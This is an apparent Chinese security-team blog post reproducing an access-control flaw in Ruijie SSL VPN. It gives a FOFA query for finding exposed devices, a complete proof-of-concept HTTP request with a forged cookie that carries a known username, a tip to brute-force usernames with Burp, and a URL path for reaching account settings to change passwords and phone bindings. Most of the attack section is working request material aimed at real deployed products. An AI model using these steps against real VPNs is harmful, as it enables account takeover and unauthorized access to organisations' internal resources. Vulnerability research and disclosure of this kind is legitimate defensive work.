> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-ZfUzM9WYo4P1d3Zq1UQjQ)

**很强点击蓝字**

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif)

**关注我们**

  

**_声明  
_**

本文作者：PeiQi  
本文字数：681

阅读时长：5min

附件 / 链接：点击查看原文下载

声明：请勿用作违法用途，否则后果自负

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

  

  

**_前言_**

  

一、

**_漏洞描述_**

Ruijie SSL VPN 存在越权访问漏洞，攻击者在已知用户名的情况下，可以对账号进行修改密码和绑定手机的操作。并在未授权的情况下查看服务器资源  

二、

**_漏洞影响  
_**

Ruijie SSL VPN  

**三、**

**_漏洞复现_**

FOFA 语法

```
icon_hash="884334722" || title="Ruijie SSL VPN"
```

  
访问目标 http://xxx.xxx.xxx.xxx/cgi-bin/installjava.cgi

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzBVvicBFUlseTHFTXALE0D9Xhiat7O9M6WcFsNedHoDzh1BMLBTicVBYmBtk5OSz0Iw6RRTB8SBO6Bqw/640?wx_fmt=png)

POC 请求包如下  

```
GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: close
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1
```

其中注意的参数为

```
Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1
```

UserName 参数为已知用户名

> 在未知登录用户名的情况下 漏洞无法利用 (根据请求包使用 Burp 进行用户名爆破)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzBVvicBFUlseTHFTXALE0D9X2GXC5nAibBTfiaJ7umWd4F0qotpichlB2ejlXf8oic5ZwicQlxfdaibsK27g/640?wx_fmt=png)

用户名正确时会返回敏感信息  

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzBVvicBFUlseTHFTXALE0D9XiaUZ2wMPv0piakRpR3pU8TgKgDd2CicZAvUc0QRUIxHqUrePul4RvZtlg/640?wx_fmt=png)

通过此方法知道用户名后可以通过漏洞修改账号参数

访问 http://xxx.xxx.xxx.xxx/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=liuw&sid=1&oper=showres

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzBVvicBFUlseTHFTXALE0D9XwRAkiaBdBf0TibGibQictAibFOaQlvyymRjibA5tCLiaer9pg8eNlk73WialYw/640?wx_fmt=png)

点击个人设置跳转页面即可修改账号信息

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzBVvicBFUlseTHFTXALE0D9XIPjHZvjRVicVeibiaL5zf0U4RdgiaMlDR39MY5l1zl94dSH5MCsJ39LpzQ/640?wx_fmt=png)

参考文章  

https://mp.weixin.qq.com/s/iRmDQJH23FJ6mL_GzXeL6g

**团队【PeiQi】师傅的微信二维码放在这了**

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzBVvicBFUlseTHFTXALE0D9XhJILPG5qnhYyI1fjI4vqjV0MgnUM4ibYRfCFaV4wk5FRaGibxMptiadRw/640?wx_fmt=png)

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzBhAsD8IU7jiccdSHt39PeyFafMeibktnt9icyS2D2fQrTSS7wdMicbrVlkqfmic6z6cCTlZVRyDicLTrqg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/gdsKIbdQtWAicUIic1QVWzsMLB46NuRg1fbH0q4M7iam8o1oibXgDBNCpwDAmS3ibvRpRIVhHEJRmiaPS5KvACNB5WgQ/640?wx_fmt=gif)